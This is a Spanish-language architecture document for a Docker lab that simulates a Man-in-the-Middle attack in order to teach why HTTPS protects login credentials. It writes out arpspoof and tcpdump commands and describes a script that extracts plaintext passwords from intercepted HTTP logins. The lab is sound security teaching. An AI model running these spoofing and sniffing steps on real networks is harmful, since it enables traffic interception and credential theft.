# Arquitectura del Sistema

## Topología de Red

El proyecto utiliza una arquitectura de red aislada mediante Docker para simular un entorno controlado de ataque Man-in-the-Middle.

### Diagrama de Red

```

 Red Docker: 172.20.0.0/16 

 VICTIM ATTACKER WEBSERVER 
 172.20.0.10 172.20.0.20 172.20.0.30 

 - Cliente - ARP Spoof - Django App 
 - Navegador - tcpdump - HTTP:80 
 - Scapy - HTTPS:443 

 Port Mapping

 HOST MACHINE 

 localhost:8080 HTTP
 localhost:8443 HTTPS

```

## Componentes del Sistema

### 1. Contenedor Victim (Cliente)

**IP:** 172.20.0.10 
**Función:** Simula un usuario legítimo navegando en la red

**Características:**
- Sistema base: Debian/Ubuntu
- Herramientas: curl, wget, navegador CLI
- Gateway: 172.20.0.20 (Atacante - ARP Spoofing)

**Flujo de tráfico:**
```
Victim → Attacker (cree que es el gateway) → Webserver
```

### 2. Contenedor Attacker (Atacante)

**IP:** 172.20.0.20 
**Función:** Interceptar y analizar tráfico de red

**Herramientas instaladas:**
- `tcpdump`: Captura de paquetes
- `scapy`: Manipulación de paquetes Python
- `arpspoof` (dsniff): ARP spoofing
- `python3`: Scripts de análisis

**Capacidades:**
- IP Forwarding habilitado
- Captura de tráfico en tiempo real
- Extracción de credenciales HTTP
- Análisis de tráfico HTTPS cifrado

**Scripts principales:**
- `arp_spoof.sh`: Envenenamiento ARP
- `capture_traffic.py`: Captura y análisis
- `monitor_traffic.py`: Monitor en tiempo real

### 3. Contenedor Webserver

**IP:** 172.20.0.30 
**Función:** Servidor web vulnerable (HTTP) y seguro (HTTPS)

**Tecnologías:**
- **Framework:** Django 4.2
- **Python:** 3.11
- **Servidor:** Gunicorn (producción) / Django dev server

**Puertos expuestos:**
- `80` → `8080` (HTTP - vulnerable)
- `443` → `8443` (HTTPS - seguro)

**Aplicación web:**
- Login form con autenticación
- Dashboard de usuario
- CSRF deshabilitado (para demo)
- Certificados SSL autofirmados

## Flujo de Ataque MitM

### Fase 1: Setup Inicial

```
1. Docker Compose levanta 3 contenedores
2. Red aislada 172.20.0.0/16 se crea
3. IPs estáticas se asignan
4. Webserver inicia en HTTP (puerto 80)
```

### Fase 2: ARP Spoofing

```
Attacker ejecuta:

 arpspoof -i eth0 -t 172.20.0.10 
 172.20.0.30 

Resultado:
- Victim cree que Attacker es Webserver
- Todo el tráfico pasa por Attacker
```

### Fase 3: Captura de Tráfico

```
Attacker ejecuta:

 tcpdump -i eth0 -s 65535 
 -w capture.pcap 
 port 80 or port 443 

Monitor en tiempo real:

 python3 monitor_traffic.py 

 - Detecta POST /login/ 
 - Extrae username y password 
 - Muestra en consola 

```

### Fase 4: Interceptación HTTP

```
Usuario hace login:
 http://localhost:8080/login/
 username=admin&password=password123

Attacker captura:

 CREDENCIALES INTERCEPTADAS 

 Usuario: admin 
 Password: password123 
 IP: 172.20.0.1 
 Timestamp: 2025-11-24 03:30:45 

```

### Fase 5: Protección con HTTPS

```
Webserver cambia a HTTPS (puerto 443)

Usuario hace login:
 https://localhost:8443/login/

Attacker captura:

 TRÁFICO CIFRADO DETECTADO 

 Datos: 
 Hex: 16 03 03 00 a5 01 00 00 a1... 

 Imposible leer credenciales 

```

## Configuración de Red Docker

### docker-compose.yml

```yaml
networks:
 mitm-lab-network:
 driver: bridge
 ipam:
 config:
 - subnet: 172.20.0.0/16
 gateway: 172.20.0.1

services:
 victim:
 networks:
 mitm-lab-network:
 ipv4_address: 172.20.0.10
 cap_add:
 - NET_ADMIN
 - NET_RAW

 attacker:
 networks:
 mitm-lab-network:
 ipv4_address: 172.20.0.20
 cap_add:
 - NET_ADMIN
 - NET_RAW
 privileged: true # Para IP forwarding

 webserver:
 networks:
 mitm-lab-network:
 ipv4_address: 172.20.0.30
 ports:
 - "8080:80" # HTTP
 - "8443:443" # HTTPS
```

## Seguridad del Entorno

### Aislamiento

 **Red completamente aislada** del host 
 **Sin acceso a Internet** desde contenedores 
 **Tráfico controlado** solo entre contenedores 
 **Puertos mapeados** solo para acceso del host 

### Permisos

- `NET_ADMIN`: Necesario para ARP spoofing
- `NET_RAW`: Necesario para captura de paquetes
- `privileged`: Solo en attacker para IP forwarding

### Limpieza

```bash
# Detener y eliminar todo
docker compose down

# Eliminar volúmenes
docker compose down -v

# Eliminar red
docker network prune
```

## Monitoreo y Logs

### Logs en tiempo real

```bash
# Ver logs de todos los contenedores
docker compose logs -f

# Ver solo attacker
docker compose logs -f attacker

# Ver solo webserver
docker compose logs -f webserver
```

### Archivos de captura

```
evidencias/
 pcap_files/
 http_capture.pcap # Tráfico HTTP
 https_capture.pcap # Tráfico HTTPS
 arp_spoof.pcap # Paquetes ARP
 logs/
 attacker.log # Logs del atacante
 webserver.log # Logs del servidor
 credentials.log # Credenciales capturadas
```

## Análisis con Wireshark

### Filtros útiles

```
# Ver solo tráfico HTTP
http

# Ver POST requests
http.request.method == "POST"

# Ver tráfico a webserver
ip.dst == 172.20.0.30

# Ver paquetes ARP
arp

# Ver handshake TLS
ssl.handshake
```

### Seguir stream TCP

```
1. Click derecho en paquete HTTP
2. Follow → TCP Stream
3. Ver credenciales en texto plano
```

## Escalabilidad

El diseño permite agregar más contenedores:

```yaml
# Agregar más víctimas
victim2:
 networks:
 mitm-lab-network:
 ipv4_address: 172.20.0.11

# Agregar servidor DNS falso
dns-server:
 networks:
 mitm-lab-network:
 ipv4_address: 172.20.0.40
```

## Referencias Técnicas

- [Docker Networking](https://docs.docker.com/network/)
- [ARP Spoofing](https://en.wikipedia.org/wiki/ARP_spoofing)
- [tcpdump Manual](https://www.tcpdump.org/manpages/tcpdump.1.html)
- [Scapy Documentation](https://scapy.readthedocs.io/)
